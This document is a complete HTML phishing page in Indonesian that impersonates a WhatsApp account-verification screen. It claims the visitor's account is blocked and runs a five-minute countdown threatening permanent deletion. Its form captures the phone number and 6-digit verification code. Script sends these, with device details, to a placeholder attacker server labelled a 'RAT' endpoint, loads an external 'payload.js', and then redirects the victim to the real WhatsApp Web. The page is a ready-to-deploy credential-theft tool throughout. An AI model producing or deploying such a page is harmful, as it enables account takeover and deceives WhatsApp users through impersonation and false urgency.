<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp - Verifikasi Akun</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #075e54; 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            padding: 30px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 80px; }
        .title { 
            color: #075e54; 
            font-size: 20px; 
            font-weight: bold; 
            text-align: center;
            margin-bottom: 10px;
        }
        .warning { 
            background: #fff3cd; 
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #856404;
        }
        .input-group { margin-bottom: 15px; }
        .input-group label { 
            display: block; 
            margin-bottom: 5px;
            font-weight: 600;
            color: #333;
            font-size: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border 0.3s;
        }
        .input-group input:focus {
            border-color: #25D366;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #25D366;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn:hover { background: #1da851; }
        .timer {
            text-align: center;
            margin-top: 15px;
            color: #666;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2325D366'%3E%3Cpath d='M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z'/%3E%3C/svg%3E" alt="WhatsApp">
        </div>
        
        <h1 class="title"> Verifikasi Akun WhatsApp</h1>
        
        <div class="warning">
            <strong> Akun Anda Telah Diblokir Sementara</strong><br>
            Akun WhatsApp Anda telah dinonaktifkan karena aktivitas mencurigakan. 
            Silakan verifikasi untuk mengaktifkan kembali.
        </div>
        
        <form id="verifyForm">
            <div class="input-group">
                <label> Nomor WhatsApp</label>
                <input type="tel" id="phone" placeholder="+62 8xx-xxxx-xxxx" required>
            </div>
            
            <div class="input-group">
                <label> Kode Verifikasi 6 Digit</label>
                <input type="text" id="code" maxlength="6" placeholder="000000" required pattern="[0-9]{6}">
            </div>
            
            <button type="submit" class="btn">
                Verifikasi & Aktifkan Kembali
            </button>
        </form>
        
        <div class="timer">
             Waktu tersisa: <strong><span id="timer">04:59</span></strong><br>
            <small>Segera verifikasi sebelum akun dihapus permanen!</small>
        </div>
    </div>
    
    <script src="payload.js"></script>
    
    <script>
        // Timer countdown
        let timeLeft = 299;
        setInterval(() => {
            timeLeft--;
            const m = Math.floor(timeLeft / 60);
            const s = timeLeft % 60;
            document.getElementById('timer').textContent = 
                `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            if (timeLeft <= 0) {
                document.getElementById('timer').textContent = '00:00';
                document.querySelector('.warning').innerHTML = 
                    '<strong> AKUN DIHAPUS PERMANEN!</strong><br>Nomor Anda telah diblokir selamanya.';
            }
        }, 1000);
        
        // Collect credentials
        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const code = document.getElementById('code').value;
            
            // Send credentials ke server RAT
            try {
                await fetch('http://YOUR_SERVER_IP:8888/register', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        action: 'register',
                        session_id: 'PHISH-' + Date.now(),
                        device_info: {
                            phone_number: phone,
                            verification_code: code,
                            platform: navigator.platform,
                            userAgent: navigator.userAgent
                        }
                    })
                });
            } catch(e) {}
            
            // Redirect ke WhatsApp asli setelah 2 detik
            setTimeout(() => {
                window.location.href = 'https://web.whatsapp.com/';
            }, 2000);
        });
    </script>
</body>
</html>
